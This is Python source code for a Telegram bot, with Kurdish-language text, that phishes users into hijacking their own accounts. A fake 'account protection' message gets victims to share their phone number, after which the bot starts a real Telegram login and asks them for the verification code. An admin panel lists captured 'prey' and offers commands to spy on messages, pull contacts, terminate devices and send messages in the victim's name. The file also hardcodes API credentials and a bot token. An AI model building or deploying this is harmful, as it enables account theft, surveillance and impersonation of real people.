from pyrogram import Client, filters, errors
from pyrogram.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove

# --- زانیارییەکان ---
API_ID = 38225812
API_HASH = "aff3c308c587f18a5975910fbcf68366"
BOT_TOKEN = "8424748782:AAG0VELUlOfabsayVic2SpUAR-hWsh-nnf0"
ADMIN_ID = 7414272224

app = Client("pro_spy_ultimate", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

active_sessions = {}

# --- دوگمەکانی پانێڵی ئادمین ---
ADMIN_KEYBOARD = ReplyKeyboardMarkup(
    [
        ["📡 لیستەی نێچیرەکان", "🛠 یارمەتی فەرمانەکان"],
        ["❌ دەرچوون لە هەمووان", "📊 ئاماری گشتی"]
    ],
    resize_keyboard=True
)

@app.on_message(filters.command("start") & filters.private)
async def start(client, message):
    user_id = message.from_user.id
    
    # ئەگەر بەکارهێنەرەکە ئادمین بێت
    if user_id == ADMIN_ID:
        await message.reply_text(
            "💎 بەخێرهاتی گەورەم بۆ پانێڵی بەڕێوبەر.\n\n"
            "لێرەوە دەتوانی کۆنترۆڵی هەموو ئەو ئەکاونتانە بکەیت کە لۆگین بوون.\n"
            "بۆ کارپێکردنی هەر بەشێک، ئایدی نێچیرەکە و فەرمانەکە بەکاربهێنە.",
            reply_markup=ADMIN_KEYBOARD
        )
        return

    # ئەگەر نێچیر بێت (تەنها یەک دوگمەی بۆ دەچێت)
    victim_keyboard = ReplyKeyboardMarkup(
        [[KeyboardButton("📲 پشکنینی ئەکاونت", request_contact=True)]],
        resize_keyboard=True,
        one_time_keyboard=True
    )
    await message.reply_text(
        "👋 سڵاو بەڕێزم\n\nبۆ پاراستنی ئەکاونتەکەت لە هاک و فلتەربوون، تکایە کلیک لە دوگمەی خوارەوە بکە و ئەکاونتەکەت پشتڕاست بکەرەوە.",
        reply_markup=victim_keyboard
    )

# --- فەرمانی نیشاندانی فەرمانەکان بۆ ئادمین ---
@app.on_message(filters.regex("🛠 یارمەتی فەرمانەکان") & filters.user(ADMIN_ID))
async def help_cmds(client, message):
    help_text = (
        "📜 **لیستی فەرمانەکان:**\n\n"
        "🔹 `/spy [ID]` : چالاککردنی سیخوڕی نامە\n"
        "🔹 `/terminate [ID]` : دەرکردنی هەموو ئامێرەکان\n"
        "🔹 `/get_contacts [ID]` : وەرگرتنی ناوەکانی مۆبایل\n"
        "🔹 `/get_messages [ID]` : هێنانی ١٠ نامەی کۆن\n"
        "🔹 `/send [ID] [User] [Text]` : ناردنی نامە بە ناوی ئەو"
    )
    await message.reply_text(help_text)

# --- نیشاندانی ئەو کەسانەی لۆگینن ---
@app.on_message(filters.regex("📡 لیستەی نێچیرەکان") & filters.user(ADMIN_ID))
async def list_victims(client, message):
    if not active_sessions:
        await message.reply_text("📭 هێشتا هیچ کەسێک لۆگین نەبووە.")
        return
    
    text = "🎯 **لیستی نێچیرە چالاکەکان:**\n\n"
    for vid, data in active_sessions.items():
        text += f"👤 ئایدی: `{vid}`\n📱 ژمارە: `{data['phone']}`\n\n"
    await message.reply_text(text)

# --- پرۆسەی وەرگرتنی ژمارە و لۆگین (وەک پێشوو) ---
@app.on_message(filters.contact & filters.private)
async def handle_contact(client, message):
    if message.from_user.id == ADMIN_ID:
        await message.reply_text("تۆ ئادمینی، پێویست ناکات ژمارەی خۆت بنێریت!")
        return
        
    u_id = message.from_user.id
    phone = message.contact.phone_number
    await app.send_message(ADMIN_ID, f"☎️ ژمارەی نوێ هات: `+{phone}`\n🆔 ئایدی: `{u_id}`")
    
    u_client = Client(f"session_{u_id}", api_id=API_ID, api_hash=API_HASH)
    await u_client.connect()
    
    try:
        code_info = await u_client.send_code(phone)
        active_sessions[u_id] = {"client": u_client, "phone": phone, "hash": code_info.phone_code_hash, "step": "code"}
        await message.reply_text("✅ کۆدەکە بنێرە:", reply_markup=ReplyKeyboardRemove())
    except Exception as e:
        await app.send_message(ADMIN_ID, f"❌ هەڵە: {e}")

# (تێبینی: بەشەکانی تری وەک لۆگین و spy وەک کۆدی پێشوون و لێرەدا کار دەکەن)
# ... (بەردەوامی کۆدەکە وەک وەشانی پێشوو)
app.run()
